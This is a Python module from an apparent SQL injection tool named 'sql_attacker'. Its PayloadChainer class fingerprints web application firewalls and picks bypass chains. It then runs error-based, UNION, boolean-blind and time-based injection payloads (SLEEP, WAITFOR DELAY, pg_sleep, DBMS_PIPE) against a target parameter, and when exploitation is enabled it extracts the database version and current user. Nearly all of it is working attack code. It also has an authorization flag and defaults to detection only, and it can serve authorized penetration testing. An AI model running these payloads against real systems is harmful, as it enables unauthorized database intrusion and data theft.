"""
payload_chainer.py – Automated SQL injection payload chaining engine.
======================================================================

The :class:`PayloadChainer` orchestrates multiple SQL injection detection
techniques in priority order, sharing context (DB type, column count, WAF
vendor, bypass chain) across techniques so that each technique can leverage
information discovered by a previous one.

Decision tree::

    WAF fingerprint → Error-based → UNION-based → Boolean blind
                                                 → Time-based (last resort)
                                                 → OOB (if configured)

Usage::

    from sql_attacker.engine.config import ScanConfig
    from sql_attacker.payload_chainer import PayloadChainer

    def my_request(url, params):
        import requests
        return requests.get(url, params=params, timeout=10)

    cfg = ScanConfig()
    chainer = PayloadChainer(cfg, request_fn=my_request, authorized=True)
    result = chainer.run_chain("https://example.com/search", "q")
    print(result.best_technique, result.findings)
"""

from __future__ import annotations

import logging
import time
import uuid
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Dict, List, Optional

from sql_attacker.engine.config import ScanConfig
from sql_attacker.engine.reporting import Evidence, Finding
from sql_attacker.engine.scoring import compute_confidence
from sql_attacker import guardrails

# ---------------------------------------------------------------------------
# Optional integrations – degrade gracefully when not installed
# ---------------------------------------------------------------------------

try:
    from sql_attacker.time_based_detector import TimeBasedDetector
except ImportError:  # pragma: no cover
    TimeBasedDetector = None  # type: ignore[assignment,misc]

try:
    from sql_attacker.union_exploiter import UnionExploiter
except ImportError:  # pragma: no cover
    UnionExploiter = None  # type: ignore[assignment,misc]

try:
    from sql_attacker.waf_profiler import WAFProfiler
except ImportError:  # pragma: no cover
    WAFProfiler = None  # type: ignore[assignment,misc]

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# Technique constants
# ---------------------------------------------------------------------------

TECHNIQUE_ERROR = "error_based"
TECHNIQUE_UNION = "union_based"
TECHNIQUE_BOOLEAN = "boolean_blind"
TECHNIQUE_TIME = "time_based"
TECHNIQUE_OOB = "oob"

#: Default ordered chain – fastest / most reliable first.
_DEFAULT_TECHNIQUE_ORDER: List[str] = [
    TECHNIQUE_ERROR,
    TECHNIQUE_UNION,
    TECHNIQUE_BOOLEAN,
    TECHNIQUE_TIME,
    TECHNIQUE_OOB,
]

# ---------------------------------------------------------------------------
# Error payloads used for error-based detection
# ---------------------------------------------------------------------------

#: Payloads indexed by DB error signature patterns they trigger.
_ERROR_PAYLOADS: Dict[str, List[str]] = {
    "generic": [
        "'",
        "''",
        "' OR '1'='1",
        '" OR "1"="1',
        "1'",
        "1\"",
    ],
}

#: Simple error-string → DB type mapping (subset; extend as needed).
_ERROR_DB_SIGNATURES: Dict[str, str] = {
    # MySQL
    "you have an error in your sql syntax": "mysql",
    "warning: mysql": "mysql",
    "unclosed quotation mark": "mssql",
    "quoted string not properly terminated": "mssql",
    "microsoft ole db": "mssql",
    "odbc microsoft access": "mssql",
    "syntax error in string in query expression": "mssql",
    "ora-": "oracle",
    "oracle error": "oracle",
    "db2 sql error": "db2",
    "sqlstate": "generic",
    "sqlite_error": "sqlite",
    "pg::": "postgres",
    "postgresql": "postgres",
    "psql": "postgres",
}

# ---------------------------------------------------------------------------
# Boolean-blind payloads
# ---------------------------------------------------------------------------

_BOOLEAN_PAYLOADS_TRUE: List[str] = [
    "' OR '1'='1' --",
    "' OR 1=1 --",
    '" OR "1"="1" --',
    "1 OR 1=1",
]

_BOOLEAN_PAYLOADS_FALSE: List[str] = [
    "' AND '1'='2' --",
    "' AND 1=2 --",
    '" AND "1"="2" --',
    "1 AND 1=2",
]


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------


@dataclass
class ChainContext:
    """Mutable shared context threaded through all chaining steps.

    Attributes
    ----------
    db_type:
        DBMS identified by an earlier technique (e.g. ``"mysql"``).
        ``None`` until identified.
    column_count:
        Number of columns in the injectable SELECT determined by UNION
        probing.  ``None`` until identified.
    injectable_columns:
        Zero-based indices of columns that reflect data back to the
        caller (visible in the response).  Empty list until identified.
    waf_vendor:
        WAF product name detected during WAF fingerprinting (e.g.
        ``"cloudflare"``).  ``None`` if not detected.
    bypass_chain:
        Ordered list of bypass technique names recommended by the WAF
        profiler for the detected vendor.
    confirmed_techniques:
        Techniques that produced a positive finding during this chain
        run, in discovery order.
    """

    db_type: Optional[str] = None
    column_count: Optional[int] = None
    injectable_columns: List[int] = field(default_factory=list)
    waf_vendor: Optional[str] = None
    bypass_chain: List[str] = field(default_factory=list)
    confirmed_techniques: List[str] = field(default_factory=list)


@dataclass
class ChainResult:
    """Outcome of a complete :meth:`PayloadChainer.run_chain` call.

    Attributes
    ----------
    url:
        Target URL that was tested.
    parameter:
        HTTP parameter name that was injected.
    findings:
        All :class:`~sql_attacker.engine.reporting.Finding` objects
        produced during the chain, from every successful technique.
    context:
        The :class:`ChainContext` state at the end of the chain.
    best_technique:
        The first technique that produced a confirmed finding, or
        ``None`` if no finding was confirmed.
    extraction_results:
        Free-form dictionary of any data extracted during the chain
        (e.g. DB version, current user).
    completed_at:
        ISO-8601 UTC timestamp of when the chain finished.
    """

    url: str
    parameter: str
    findings: List[Finding] = field(default_factory=list)
    context: ChainContext = field(default_factory=ChainContext)
    best_technique: Optional[str] = None
    extraction_results: Dict[str, Any] = field(default_factory=dict)
    completed_at: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )


# ---------------------------------------------------------------------------
# Main class
# ---------------------------------------------------------------------------


class PayloadChainer:
    """Automated SQL injection payload chaining engine.

    The engine runs techniques in priority order, short-circuits when a
    high-confidence finding is obtained, and passes shared context to
    every subsequent technique so that later stages can exploit knowledge
    gained by earlier ones.

    Parameters
    ----------
    config:
        :class:`~sql_attacker.engine.config.ScanConfig` governing timeouts,
        concurrency budget, and per-host request limits.
    request_fn:
        Callable used to make HTTP requests.  It receives
        ``(url: str, params: Dict[str, str], method: str)`` and must
        return an object with at least:

        * ``.status_code: int``
        * ``.text: str``
        * ``.elapsed.total_seconds() -> float`` (or ``.elapsed_ms: float``)

        Any exception raised by ``request_fn`` is caught and logged.
    authorized:
        Must be ``True`` to allow active probing.  Passed directly to
        :func:`~sql_attacker.guardrails.check_authorization`.
    enable_exploitation:
        When ``True``, the chain may attempt data-extraction steps after
        detecting a vulnerability.  Defaults to ``False`` (detection only).
    """

    def __init__(
        self,
        config: ScanConfig,
        request_fn: Callable,
        authorized: bool = False,
        enable_exploitation: bool = False,
    ) -> None:
        self.config = config
        self.request_fn = request_fn
        self.authorized = authorized
        self.enable_exploitation = enable_exploitation
        self._max_workers: int = max(1, getattr(config, "max_concurrent_requests", 1))

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def get_technique_order(self) -> List[str]:
        """Return the ordered list of techniques this chainer will attempt.

        The order follows the decision tree documented at module level.
        Techniques whose dependencies are unavailable (optional imports)
        are still listed; they will be skipped gracefully at runtime.

        Returns
        -------
        List[str]
            Ordered technique names.
        """
        return list(_DEFAULT_TECHNIQUE_ORDER)

    def run_chain(
        self,
        url: str,
        parameter: str,
        method: str = "GET",
    ) -> ChainResult:
        """Run the full technique chain against a single injection point.

        The chain executes as follows:

        1. WAF fingerprinting (populates :attr:`ChainContext.waf_vendor` and
           :attr:`ChainContext.bypass_chain`).
        2. Error-based detection.
        3. UNION-based detection (uses DB type from step 2 if available).
        4. Boolean-blind detection.
        5. Time-based detection (uses :class:`TimeBasedDetector` if available).
        6. OOB (placeholder; skipped unless a concrete OOB callback is
           configured via ``config``).

        The chain terminates early as soon as a ``"confirmed"`` finding is
        produced, unless all techniques are exhausted.

        Parameters
        ----------
        url:
            Target endpoint URL.
        parameter:
            Name of the HTTP parameter to inject.
        method:
            HTTP method: ``"GET"`` (default) or ``"POST"``.

        Returns
        -------
        ChainResult
            Aggregated results including all findings and shared context.

        Raises
        ------
        ~sql_attacker.guardrails.AuthorizationError
            If ``authorized`` was not set to ``True`` on construction.
        """
        guardrails.check_authorization(self.authorized)

        context = ChainContext()
        result = ChainResult(url=url, parameter=parameter, context=context)

        # Step 1 – WAF fingerprint (informational; never terminates the chain)
        self._run_waf_fingerprint(url, parameter, context)

        technique_order = self.get_technique_order()

        for technique in technique_order:
            if technique == TECHNIQUE_OOB:
                # OOB requires explicit callback infrastructure; skip unless
                # a future subclass / plugin provides it.
                logger.debug("Skipping OOB technique (not configured)")
                continue

            finding = self.run_technique(
                technique=technique,
                url=url,
                parameter=parameter,
                method=method,
                context=context.__dict__,
            )

            if finding is not None:
                result.findings.append(finding)
                context.confirmed_techniques.append(technique)

                # Propagate DB type to context so later techniques can use it
                if finding.db_type and finding.db_type != "unknown":
                    if context.db_type is None:
                        context.db_type = finding.db_type
                        logger.info(
                            "DB type identified as %r via %s",
                            context.db_type,
                            technique,
                        )

                # Record best (first confirmed) technique
                if result.best_technique is None and finding.verdict == "confirmed":
                    result.best_technique = technique

                # Early termination on high-confidence confirmed finding
                if finding.verdict == "confirmed" and finding.confidence >= 0.85:
                    logger.info(
                        "Early termination: high-confidence finding via %s (%.2f)",
                        technique,
                        finding.confidence,
                    )
                    break

        # Optionally attempt extraction if a confirmed finding exists and
        # exploitation is enabled.
        if self.enable_exploitation and result.best_technique:
            result.extraction_results = self._attempt_extraction(
                url, parameter, method, context
            )

        result.completed_at = datetime.now(timezone.utc).isoformat()
        return result

    def run_technique(
        self,
        technique: str,
        url: str,
        parameter: str,
        method: str = "GET",
        context: Optional[Dict[str, Any]] = None,
    ) -> Optional[Finding]:
        """Run a single named technique and return a :class:`Finding` or ``None``.

        This method is intentionally public so that callers can probe a
        specific technique without running the full chain.

        Parameters
        ----------
        technique:
            One of ``"error_based"``, ``"union_based"``, ``"boolean_blind"``,
            ``"time_based"``, or ``"oob"``.
        url:
            Target endpoint URL.
        parameter:
            HTTP parameter to inject.
        method:
            HTTP method: ``"GET"`` (default) or ``"POST"``.
        context:
            Optional dictionary of contextual values from prior techniques
            (e.g. ``{"db_type": "mysql", "column_count": 3}``).  Keys
            correspond to :class:`ChainContext` field names.

        Returns
        -------
        Finding or None
            A finding if the technique detected a vulnerability, else ``None``.

        Raises
        ------
        ~sql_attacker.guardrails.AuthorizationError
            If ``authorized`` was not set to ``True`` on construction.
        ValueError
            If *technique* is not a recognised technique name.
        """
        guardrails.check_authorization(self.authorized)

        ctx = context or {}

        dispatch: Dict[str, Callable[..., Optional[Finding]]] = {
            TECHNIQUE_ERROR: self._run_error_based,
            TECHNIQUE_UNION: self._run_union_based,
            TECHNIQUE_BOOLEAN: self._run_boolean_blind,
            TECHNIQUE_TIME: self._run_time_based,
            TECHNIQUE_OOB: self._run_oob,
        }

        handler = dispatch.get(technique)
        if handler is None:
            raise ValueError(
                f"Unknown technique {technique!r}. "
                f"Valid values: {list(dispatch)}"
            )

        try:
            return handler(url, parameter, method, ctx)
        except Exception as exc:  # pylint: disable=broad-except
            logger.warning("Technique %r raised an exception: %s", technique, exc)
            return None

    # ------------------------------------------------------------------
    # WAF fingerprinting
    # ------------------------------------------------------------------

    def _run_waf_fingerprint(
        self,
        url: str,
        parameter: str,
        context: ChainContext,
    ) -> None:
        """Populate *context* with WAF vendor and bypass chain if detectable."""
        if WAFProfiler is None:
            logger.debug("WAFProfiler not available; skipping WAF fingerprint")
            return

        try:
            profiler = WAFProfiler(config=self.config, request_fn=self.request_fn)
            profile = profiler.fingerprint(url, parameter=parameter)
            if profile.vendor:
                context.waf_vendor = str(profile.vendor)
                context.bypass_chain = profiler.get_bypass_chain(context.waf_vendor)
                logger.info(
                    "WAF detected: %s – bypass chain: %s",
                    context.waf_vendor,
                    context.bypass_chain,
                )
        except Exception as exc:  # pylint: disable=broad-except
            logger.debug("WAF fingerprint failed: %s", exc)

    # ------------------------------------------------------------------
    # Technique implementations
    # ------------------------------------------------------------------

    def _run_error_based(
        self,
        url: str,
        parameter: str,
        method: str,
        context: Dict[str, Any],
    ) -> Optional[Finding]:
        """Probe for database error messages leaked in the response.

        Sends several error-inducing payloads and inspects the response
        body for known DBMS error patterns.

        Parameters
        ----------
        url, parameter, method:
            Standard injection-point descriptors.
        context:
            Shared chain context dict (may be updated in-place).

        Returns
        -------
        Finding or None
        """
        logger.debug("Running error-based technique on %s[%s]", url, parameter)

        payloads = _ERROR_PAYLOADS.get("generic", [])
        evidence_list: List[Evidence] = []
        detected_db = context.get("db_type")

        for payload in payloads:
            response = self._send_payload(url, parameter, method, payload)
            if response is None:
                continue

            body_lower = response.text.lower()
            matched_db: Optional[str] = detected_db

            for signature, db in _ERROR_DB_SIGNATURES.items():
                if signature in body_lower:
                    matched_db = db
                    evidence_list.append(
                        Evidence(
                            payload=payload,
                            request_summary=self._format_request_summary(
                                url, parameter, method, payload
                            ),
                            response_length=len(response.text),
                            response_body_excerpt=self._excerpt(response.text, 512),
                            technique="error",
                        )
                    )
                    logger.debug(
                        "Error-based: matched signature %r → DB %r", signature, db
                    )
                    break

            if evidence_list:
                detected_db = matched_db
                break  # Stop after first confirmed evidence

        if not evidence_list:
            return None

        scoring_result = compute_confidence(
            {"error_message_present": 1.0, "db_type_identified": 1.0 if detected_db else 0.5}
        )
        return Finding(
            parameter=parameter,
            technique=TECHNIQUE_ERROR,
            db_type=detected_db or "unknown",
            confidence=scoring_result.score,
            verdict=scoring_result.verdict,
            evidence=evidence_list,
            url=url,
            method=method,
        )

    def _run_union_based(
        self,
        url: str,
        parameter: str,
        method: str,
        context: Dict[str, Any],
    ) -> Optional[Finding]:
        """Attempt UNION-based injection using :class:`UnionExploiter` if available.

        Falls back to a lightweight NULL-column probe when ``UnionExploiter``
        is not installed.

        Parameters
        ----------
        url, parameter, method:
            Standard injection-point descriptors.
        context:
            Shared chain context dict.  ``db_type`` and ``column_count``
            are read and potentially updated.

        Returns
        -------
        Finding or None
        """
        logger.debug("Running UNION-based technique on %s[%s]", url, parameter)

        db_type: Optional[str] = context.get("db_type")

        if UnionExploiter is not None:
            try:
                exploiter = UnionExploiter(
                    config=self.config,
                    request_fn=self.request_fn,
                    db_type=db_type,
                )
                # detect_column_count returns the count or None
                col_count = exploiter.detect_column_count(
                    url=url, parameter=parameter, method=method
                )
                if col_count is not None:
                    context["column_count"] = col_count
                    evidence = Evidence(
                        payload=f"' UNION SELECT {','.join(['NULL'] * col_count)} --",
                        request_summary=self._format_request_summary(
                            url,
                            parameter,
                            method,
                            f"UNION NULL×{col_count}",
                        ),
                        technique="union",
                    )
                    scoring_result = compute_confidence(
                        {
                            "union_column_count_confirmed": 1.0,
                            "db_type_identified": 1.0 if db_type else 0.5,
                        }
                    )
                    return Finding(
                        parameter=parameter,
                        technique=TECHNIQUE_UNION,
                        db_type=db_type or "unknown",
                        confidence=scoring_result.score,
                        verdict=scoring_result.verdict,
                        evidence=[evidence],
                        url=url,
                        method=method,
                    )
            except Exception as exc:  # pylint: disable=broad-except
                logger.debug("UnionExploiter raised: %s", exc)
                return None

        # Fallback lightweight probe: try UNION SELECT NULL, NULL x1..10
        return self._union_null_probe(url, parameter, method, db_type)

    def _union_null_probe(
        self,
        url: str,
        parameter: str,
        method: str,
        db_type: Optional[str],
    ) -> Optional[Finding]:
        """Minimal UNION probe that iterates NULL columns from 1 to 10."""
        baseline = self._send_payload(url, parameter, method, "1")
        if baseline is None:
            return None
        baseline_len = len(baseline.text)

        for col_count in range(1, 11):
            nulls = ",".join(["NULL"] * col_count)
            payload = f"' UNION SELECT {nulls} --"
            response = self._send_payload(url, parameter, method, payload)
            if response is None:
                continue

            response_len = len(response.text)
            # A successful UNION usually changes the response length noticeably
            if response.status_code == 200 and abs(response_len - baseline_len) > 50:
                evidence = Evidence(
                    payload=payload,
                    request_summary=self._format_request_summary(
                        url, parameter, method, payload
                    ),
                    response_length=response_len,
                    response_body_excerpt=self._excerpt(response.text, 256),
                    technique="union",
                )
                scoring_result = compute_confidence(
                    {"union_response_length_change": 0.7}
                )
                return Finding(
                    parameter=parameter,
                    technique=TECHNIQUE_UNION,
                    db_type=db_type or "unknown",
                    confidence=scoring_result.score,
                    verdict=scoring_result.verdict,
                    evidence=[evidence],
                    url=url,
                    method=method,
                )
        return None

    def _run_boolean_blind(
        self,
        url: str,
        parameter: str,
        method: str,
        context: Dict[str, Any],
    ) -> Optional[Finding]:
        """Detect boolean-blind injection by comparing TRUE vs FALSE responses.

        Sends ``TRUE`` and ``FALSE`` payload variants and looks for
        statistically significant differences in response length.

        Parameters
        ----------
        url, parameter, method:
            Standard injection-point descriptors.
        context:
            Shared chain context dict.

        Returns
        -------
        Finding or None
        """
        logger.debug("Running boolean-blind technique on %s[%s]", url, parameter)

        db_type: Optional[str] = context.get("db_type")

        differences: List[int] = []
        evidence_list: List[Evidence] = []

        for true_payload, false_payload in zip(
            _BOOLEAN_PAYLOADS_TRUE, _BOOLEAN_PAYLOADS_FALSE
        ):
            true_resp = self._send_payload(url, parameter, method, true_payload)
            false_resp = self._send_payload(url, parameter, method, false_payload)
            if true_resp is None or false_resp is None:
                continue

            diff = abs(len(true_resp.text) - len(false_resp.text))
            differences.append(diff)

            if diff > 20:
                evidence_list.append(
                    Evidence(
                        payload=f"TRUE={true_payload!r} | FALSE={false_payload!r}",
                        request_summary=self._format_request_summary(
                            url, parameter, method, true_payload
                        ),
                        response_length=len(true_resp.text),
                        response_body_excerpt=self._excerpt(true_resp.text, 256),
                        technique="boolean",
                    )
                )

        if not evidence_list:
            return None

        avg_diff = sum(differences) / len(differences) if differences else 0
        confidence_boost = min(1.0, avg_diff / 200.0)  # normalise; cap at 1.0

        scoring_result = compute_confidence(
            {
                "boolean_response_difference": confidence_boost,
                "db_type_identified": 1.0 if db_type else 0.5,
            }
        )
        return Finding(
            parameter=parameter,
            technique=TECHNIQUE_BOOLEAN,
            db_type=db_type or "unknown",
            confidence=scoring_result.score,
            verdict=scoring_result.verdict,
            evidence=evidence_list,
            url=url,
            method=method,
        )

    def _run_time_based(
        self,
        url: str,
        parameter: str,
        method: str,
        context: Dict[str, Any],
    ) -> Optional[Finding]:
        """Detect time-based blind injection via :class:`TimeBasedDetector`.

        Delegates entirely to :class:`TimeBasedDetector` when available.
        Falls back to a simple sleep-payload probe when the module is absent.

        Parameters
        ----------
        url, parameter, method:
            Standard injection-point descriptors.
        context:
            Shared chain context dict.  ``db_type`` is forwarded to the
            detector so it can select DB-specific ``SLEEP``/``WAITFOR``
            payloads.

        Returns
        -------
        Finding or None
        """
        logger.debug("Running time-based technique on %s[%s]", url, parameter)

        db_type: Optional[str] = context.get("db_type")

        if TimeBasedDetector is not None:
            try:
                detector = TimeBasedDetector(
                    config=self.config,
                    request_fn=self.request_fn,
                )
                finding = detector.detect(
                    url=url,
                    parameter=parameter,
                    method=method,
                    db_hint=db_type,
                )
                return finding
            except Exception as exc:  # pylint: disable=broad-except
                logger.debug("TimeBasedDetector raised: %s", exc)
                return None

        return self._time_based_fallback(url, parameter, method, db_type)

    def _time_based_fallback(
        self,
        url: str,
        parameter: str,
        method: str,
        db_type: Optional[str],
    ) -> Optional[Finding]:
        """Minimal time-based probe used when TimeBasedDetector is unavailable."""
        # Select delay payloads by DB type when known
        db_payloads: Dict[str, str] = {
            "mysql": "' AND SLEEP(5) --",
            "mssql": "'; WAITFOR DELAY '0:0:5' --",
            "postgres": "'; SELECT pg_sleep(5) --",
            "oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) --",
        }
        generic_payload = "' AND SLEEP(5) --"
        payload = db_payloads.get(db_type or "", generic_payload)

        # Baseline timing
        baseline_start = time.monotonic()
        baseline_resp = self._send_payload(url, parameter, method, "1")
        baseline_elapsed = time.monotonic() - baseline_start

        if baseline_resp is None:
            return None

        # Inject delay payload
        inject_start = time.monotonic()
        inject_resp = self._send_payload(url, parameter, method, payload)
        inject_elapsed = time.monotonic() - inject_start

        if inject_resp is None:
            return None

        delay_observed = inject_elapsed - baseline_elapsed
        if delay_observed < 4.0:  # threshold: at least 4 s extra
            return None

        evidence = Evidence(
            payload=payload,
            request_summary=self._format_request_summary(
                url, parameter, method, payload
            ),
            response_length=len(inject_resp.text),
            timing_samples_ms=[inject_elapsed * 1000],
            baseline_median_ms=baseline_elapsed * 1000,
            technique="time",
        )
        scoring_result = compute_confidence(
            {
                "timing_delay_observed": min(1.0, delay_observed / 10.0),
                "db_type_identified": 1.0 if db_type else 0.5,
            }
        )
        return Finding(
            parameter=parameter,
            technique=TECHNIQUE_TIME,
            db_type=db_type or "unknown",
            confidence=scoring_result.score,
            verdict=scoring_result.verdict,
            evidence=[evidence],
            url=url,
            method=method,
        )

    def _run_oob(
        self,
        url: str,
        parameter: str,
        method: str,
        context: Dict[str, Any],
    ) -> Optional[Finding]:
        """OOB technique placeholder.

        Out-of-band injection requires an external callback infrastructure
        (e.g. Burp Collaborator, an ngrok endpoint).  This method is a stub
        that returns ``None`` unless a subclass overrides it.

        Parameters
        ----------
        url, parameter, method, context:
            Standard technique parameters.

        Returns
        -------
        None
            Always returns ``None`` in the base implementation.
        """
        logger.debug(
            "OOB technique not implemented in base PayloadChainer; override to enable"
        )
        return None

    # ------------------------------------------------------------------
    # Parallel evaluation helper
    # ------------------------------------------------------------------

    def _run_parallel(
        self,
        techniques: List[str],
        url: str,
        parameter: str,
        method: str,
        context: Dict[str, Any],
    ) -> List[Finding]:
        """Run a subset of techniques in parallel, returning all findings.

        Unlike the sequential chain in :meth:`run_chain`, this helper does
        **not** short-circuit on success – it lets all submitted techniques
        complete (subject to thread-pool size) so that callers can compare
        results.  Use this for reconnaissance phases where you want to gather
        information from multiple techniques simultaneously.

        Parameters
        ----------
        techniques:
            Technique names to execute in parallel.
        url, parameter, method:
            Injection-point descriptors passed to each technique.
        context:
            Shared context dictionary.  Note that parallel workers receive
            a *shallow copy* of the context to avoid data-race corruption;
            the caller must merge results manually.

        Returns
        -------
        List[Finding]
            All non-``None`` findings, in completion order.
        """
        findings: List[Finding] = []
        ctx_copy = dict(context)

        with ThreadPoolExecutor(max_workers=self._max_workers) as executor:
            future_to_technique: Dict[Future[Optional[Finding]], str] = {
                executor.submit(
                    self.run_technique, tech, url, parameter, method, dict(ctx_copy)
                ): tech
                for tech in techniques
            }
            for future in as_completed(future_to_technique):
                tech = future_to_technique[future]
                try:
                    finding = future.result()
                except Exception as exc:  # pylint: disable=broad-except
                    logger.warning("Parallel technique %r failed: %s", tech, exc)
                    continue
                if finding is not None:
                    findings.append(finding)

        return findings

    # ------------------------------------------------------------------
    # Extraction helper (invoked when enable_exploitation=True)
    # ------------------------------------------------------------------

    def _attempt_extraction(
        self,
        url: str,
        parameter: str,
        method: str,
        context: ChainContext,
    ) -> Dict[str, Any]:
        """Attempt basic data extraction using the best confirmed technique.

        Currently leverages :class:`UnionExploiter` for UNION-based extraction
        and :class:`TimeBasedDetector` for time-based extraction when those
        modules are available.

        Parameters
        ----------
        url, parameter, method:
            Injection-point descriptors.
        context:
            Populated :class:`ChainContext` from the completed chain.

        Returns
        -------
        Dict[str, Any]
            Extracted values keyed by item name (e.g. ``"db_version"``,
            ``"current_user"``).  Empty dict if extraction is not possible.
        """
        extracted: Dict[str, Any] = {}

        if TECHNIQUE_UNION in context.confirmed_techniques and UnionExploiter is not None:
            try:
                exploiter = UnionExploiter(
                    config=self.config,
                    request_fn=self.request_fn,
                    db_type=context.db_type,
                )
                version = exploiter.extract_version(
                    url=url,
                    parameter=parameter,
                    method=method,
                    column_count=context.column_count,
                )
                if version:
                    extracted["db_version"] = version
            except Exception as exc:  # pylint: disable=broad-except
                logger.debug("UNION extraction failed: %s", exc)

        if TECHNIQUE_TIME in context.confirmed_techniques and TimeBasedDetector is not None:
            try:
                detector = TimeBasedDetector(
                    config=self.config,
                    request_fn=self.request_fn,
                )
                user = detector.extract_string(
                    url=url,
                    parameter=parameter,
                    method=method,
                    expression="USER()",
                )
                if user:
                    extracted["current_user"] = user
            except Exception as exc:  # pylint: disable=broad-except
                logger.debug("Time-based extraction failed: %s", exc)

        return extracted

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _send_payload(
        self,
        url: str,
        parameter: str,
        method: str,
        payload: str,
    ) -> Any:
        """Send a single payload and return the response, or ``None`` on error.

        Parameters
        ----------
        url:
            Target endpoint.
        parameter:
            HTTP parameter name to inject the payload into.
        method:
            ``"GET"`` or ``"POST"``.
        payload:
            The raw injection string.

        Returns
        -------
        Response-like object or None
        """
        try:
            params = {parameter: payload}
            return self.request_fn(url, params, method)
        except Exception as exc:  # pylint: disable=broad-except
            logger.debug("request_fn raised for payload %r: %s", payload, exc)
            return None

    @staticmethod
    def _format_request_summary(
        url: str, parameter: str, method: str, payload: str
    ) -> str:
        """Build a concise human-readable request description.

        Parameters
        ----------
        url, parameter, method, payload:
            Injection-point details.

        Returns
        -------
        str
            E.g. ``"GET /search?q=<payload> HTTP/1.1"``
        """
        if method.upper() == "GET":
            return f"GET {url}?{parameter}={payload} HTTP/1.1"
        return f"POST {url} [{parameter}={payload}] HTTP/1.1"

    @staticmethod
    def _excerpt(text: str, max_length: int) -> str:
        """Return a truncated excerpt of *text*, safe for storage in Evidence.

        Parameters
        ----------
        text:
            Full response body text.
        max_length:
            Maximum number of characters to retain.

        Returns
        -------
        str
        """
        if len(text) <= max_length:
            return text
        return text[:max_length]
